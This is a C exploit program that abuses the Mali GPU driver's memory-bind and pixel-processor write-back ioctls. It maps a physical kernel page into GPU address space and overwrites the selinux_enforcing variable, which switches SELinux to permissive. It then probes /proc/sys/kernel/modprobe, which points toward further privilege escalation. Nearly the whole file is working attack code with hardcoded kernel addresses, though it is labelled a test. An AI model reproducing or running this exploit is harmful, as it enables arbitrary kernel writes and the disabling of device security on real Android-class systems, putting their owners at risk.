/*
 * kort_selinux_test.c - Test: write 0 to selinux_enforcing via WB
 *
 * Uses FIXED PLB (no B0). If successful, getenforce returns Permissive.
 *
 * selinux_enforcing is an int in the kernel BSS.
 * phys = 0x01080000 + 0x19B94EC = 0x02A394EC
 * page = 0x02A39000, in-page offset = 0x4EC
 *
 * WARNING: this modifies kernel memory. Should be safe (just disables SELinux).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>

#define MALI_IOC_MEM_ALLOC      0xC0288300u
#define MALI_IOC_MEM_BIND       0xC0288302u
#define MALI_IOC_MEM_UNBIND     0xC0108303u
#define MALI_IOC_PP_START_JOB   0xC1988400u
#define MALI_IOC_WAIT_FOR_NOTIFICATION 0xC0688202u

#define _MALI_NOTIFICATION_PP_FINISHED ((2 << 16) | 0x10)
#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY (1 << 11)

typedef struct {
    uint64_t ctx; uint32_t gpu_vaddr; uint32_t vsize; uint32_t psize;
    uint32_t flags; uint64_t backend_handle; int32_t secure_shared_fd;
} mali_uk_alloc_mem_s;

typedef struct {
    uint64_t ctx; uint32_t vaddr; uint32_t size; uint32_t flags;
    uint32_t padding; uint32_t phys_addr; uint32_t rights;
    uint32_t bind_flags; uint32_t pad2;
} mali_uk_bind_mem_s;

typedef struct {
    uint64_t ctx; uint32_t vaddr; uint32_t flags;
} mali_uk_unbind_mem_s;

#define MALI_UK_TIMELINE_MAX 3
typedef struct { uint32_t points[MALI_UK_TIMELINE_MAX]; int32_t sync_fd; } mali_uk_fence_t;

typedef struct {
    uint64_t ctx; uint64_t user_job_ptr; uint32_t priority;
    uint32_t frame_registers[23];
    uint32_t frame_registers_addr_frame[7];
    uint32_t frame_registers_addr_stack[7];
    uint32_t wb0_registers[12]; uint32_t wb1_registers[12]; uint32_t wb2_registers[12];
    uint32_t dlbu_registers[4];
    uint32_t num_cores; uint32_t perf_counter_flag;
    uint32_t perf_counter_src0; uint32_t perf_counter_src1;
    uint32_t frame_builder_id; uint32_t flush_id; uint32_t flags;
    uint32_t tilesx; uint32_t tilesy; uint32_t heatmap_mem;
    uint32_t num_memory_cookies; uint64_t memory_cookies;
    mali_uk_fence_t fence; uint64_t timeline_point_ptr;
} mali_uk_pp_start_job_s;

typedef struct {
    uint64_t ctx; uint32_t type; uint32_t _pad; uint8_t data[88];
} mali_uk_wait_for_notification_s;

#define FR_PLBU_ARRAY_ADDR 0
#define FR_RENDER_ADDR     1
#define FR_FLAGS           3
#define FR_CLEAR_COLOR_0   6
#define FR_CLEAR_COLOR_1   7
#define FR_CLEAR_COLOR_2   8
#define FR_CLEAR_COLOR_3   9
#define FR_WIDTH          10
#define FR_HEIGHT         11
#define FR_FRAG_STACK_ADDR 12
#define FR_FRAG_STACK_SIZE 13

#define WB_TYPE         0
#define WB_ADDRESS      1
#define WB_PIXEL_FORMAT 2
#define WB_DOWNSAMPLE   3
#define WB_PIXEL_LAYOUT 4
#define WB_PITCH        5
#define WB_TARGET_FLAGS 6
#define WB_MRT_ENABLE   7

#define GPU_VA_DATA  0x40000000u
#define GPU_VA_TGT   0x40300000u
#define BUF_SIZE     0x4000

/* selinux_enforcing physical address */
#define KERNEL_PHYS_BASE        0x01080000u
#define SELINUX_ENFORCING_RVA   0x19B94ECu
#define SELINUX_ENFORCING_PHYS  (KERNEL_PHYS_BASE + SELINUX_ENFORCING_RVA)
#define SELINUX_ENFORCING_PAGE  (SELINUX_ENFORCING_PHYS & ~0xFFFu)
#define SELINUX_ENFORCING_INPAGE (SELINUX_ENFORCING_PHYS & 0xFFFu)

static int fd = -1;
static volatile int g_to = 0;
static void alh(int s) { (void)s; g_to = 1; }

static int tio(unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno;
    alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

/*
 * Write one u32 to gpu_target via WB (16x16 RGBA8888).
 * Uses FIXED PLB (no B0).
 *
 * Byte order: clear_color is ARGB, WB writes RGBA bytes to memory.
 * To get memory bytes [b0,b1,b2,b3]: set clear_color = (b3<<24)|(b0<<16)|(b1<<8)|b2.
 * For all-equal bytes (like 0x00000000): no byte-order issue.
 */
static int wb_write_u32(uint32_t *buf, uint32_t gpu_target, uint32_t clear_color)
{
    memset(buf, 0, BUF_SIZE);

    /* Tile block (empty) */
    memset((uint8_t *)buf + 0x200, 0, 64);

    /* Fragment shader */
    static const uint32_t shader[] = {
        0x00020425, 0x0000000c, 0x01e007cf, 0xb0000000, 0x000005f5,
    };
    memcpy((uint8_t *)buf + 0x080, shader, sizeof(shader));

    /* FIXED PLB (no B0) */
    uint32_t *plb = buf;
    uint32_t tileblk_gpu = GPU_VA_DATA + 0x200;
    plb[0] = 0x00000000;
    plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | ((tileblk_gpu >> 3) & ~0xE0000003u);
    plb[3] = 0xBC000000;

    /* RSW */
    uint32_t *rsw = (uint32_t *)((uint8_t *)buf + 0x100);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = (GPU_VA_DATA + 0x080) | 5;
    rsw[0x0D] = 0x00000100;

    /* PP job */
    mali_uk_pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xDEADBEEFCAFEBABEULL;
    job.num_cores = 1;

    job.frame_registers[FR_PLBU_ARRAY_ADDR] = GPU_VA_DATA + 0x000;
    job.frame_registers[FR_RENDER_ADDR]     = GPU_VA_DATA + 0x100;
    job.frame_registers[FR_FLAGS]           = 0x01;
    job.frame_registers[FR_CLEAR_COLOR_0]   = clear_color;
    job.frame_registers[FR_CLEAR_COLOR_1]   = clear_color;
    job.frame_registers[FR_CLEAR_COLOR_2]   = clear_color;
    job.frame_registers[FR_CLEAR_COLOR_3]   = clear_color;
    job.frame_registers[FR_WIDTH]           = 16;
    job.frame_registers[FR_HEIGHT]          = 16;
    job.frame_registers[FR_FRAG_STACK_ADDR] = GPU_VA_DATA + 0x1000;
    job.frame_registers[FR_FRAG_STACK_SIZE] = 0x400;

    /* WB0 */
    job.wb0_registers[WB_TYPE]         = 0x02;
    job.wb0_registers[WB_ADDRESS]      = gpu_target;
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;
    job.wb0_registers[WB_DOWNSAMPLE]   = 0;
    job.wb0_registers[WB_PIXEL_LAYOUT] = 0;
    job.wb0_registers[WB_PITCH]        = (16 * 4) / 8;  /* 8 (in 8-byte units) */
    job.wb0_registers[WB_TARGET_FLAGS] = 0;
    job.wb0_registers[WB_MRT_ENABLE]   = 0;

    job.fence.sync_fd = -1;
    uint32_t tl = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&tl;

    __builtin___clear_cache((char *)buf, (char *)buf + BUF_SIZE);

    int r = tio(MALI_IOC_PP_START_JOB, &job, 5);
    if (r == -999) return -999;
    if (r != 0) return r;

    mali_uk_wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    r = tio(MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 5);
    if (r == -999) return -999;
    if (r != 0) return r;

    if (notif.type != _MALI_NOTIFICATION_PP_FINISHED) return -2;

    uint32_t status;
    memcpy(&status, notif.data + 8, 4);
    return (status & (1 << 16)) ? 0 : -1;
}

int main(void)
{
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alh;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("=== SELinux Enforcing Write Test ===\n\n");
    printf("selinux_enforcing: phys=0x%08x, page=0x%08x, offset=0x%x\n\n",
           SELINUX_ENFORCING_PHYS, SELINUX_ENFORCING_PAGE, SELINUX_ENFORCING_INPAGE);

    fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("open /dev/mali"); return 1; }
    printf("[+] opened /dev/mali\n");

    /* ALLOC */
    mali_uk_alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.vsize = BUF_SIZE;
    alloc.psize = BUF_SIZE;
    if (tio(MALI_IOC_MEM_ALLOC, &alloc, 3) != 0) {
        printf("[-] ALLOC failed\n"); return 1;
    }
    printf("[+] ALLOC_MEM OK\n");

    uint32_t *buf = (uint32_t *)mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE,
                                      MAP_SHARED, fd, GPU_VA_DATA);
    if (buf == MAP_FAILED) { perror("mmap"); return 1; }
    printf("[+] mmap OK\n\n");

    /* Check current state */
    printf("[*] current SELinux status:\n");
    printf("  ");
    fflush(stdout);
    system("getenforce");
    printf("\n");

    /* BIND selinux_enforcing page */
    printf("[*] BIND selinux page 0x%08x -> GPU VA 0x%08x\n",
           SELINUX_ENFORCING_PAGE, GPU_VA_TGT);
    {
        mali_uk_bind_mem_s b;
        memset(&b, 0, sizeof(b));
        b.vaddr = GPU_VA_TGT;
        b.size = 4096;
        b.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
        b.phys_addr = SELINUX_ENFORCING_PAGE;
        b.rights = 0x37;
        int r = tio(MALI_IOC_MEM_BIND, &b, 3);
        if (r != 0) {
            printf("[-] BIND failed: %s\n", strerror(-r));
            goto out;
        }
    }
    printf("[+] BIND OK\n\n");

    /* Write 0 to selinux_enforcing */
    printf("[*] WB write 0x00000000 to selinux_enforcing+0x%x\n", SELINUX_ENFORCING_INPAGE);
    {
        int r = wb_write_u32(buf,
                             GPU_VA_TGT + SELINUX_ENFORCING_INPAGE,
                             0x00000000);
        if (r == -999) {
            printf("[-] WB TIMEOUT / HUNG!\n");
            goto unbind;
        }
        if (r != 0) {
            printf("[-] WB FAILED (ret=%d)\n", r);
            goto unbind;
        }
    }
    printf("[+] WB write SUCCESS\n\n");

    /* Check if SELinux was disabled */
    printf("[*] SELinux status after write:\n");
    printf("  ");
    fflush(stdout);
    system("getenforce");

    printf("\n[*] Also try reading /proc/sys/kernel/modprobe (was blocked):\n");
    printf("  ");
    fflush(stdout);
    system("cat /proc/sys/kernel/modprobe 2>&1");

unbind:
    {
        mali_uk_unbind_mem_s u;
        memset(&u, 0, sizeof(u));
        u.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
        u.vaddr = GPU_VA_TGT;
        tio(MALI_IOC_MEM_UNBIND, &u, 3);
    }

out:
    munmap(buf, BUF_SIZE);
    close(fd);
    printf("\n=== Done ===\n");
    return 0;
}
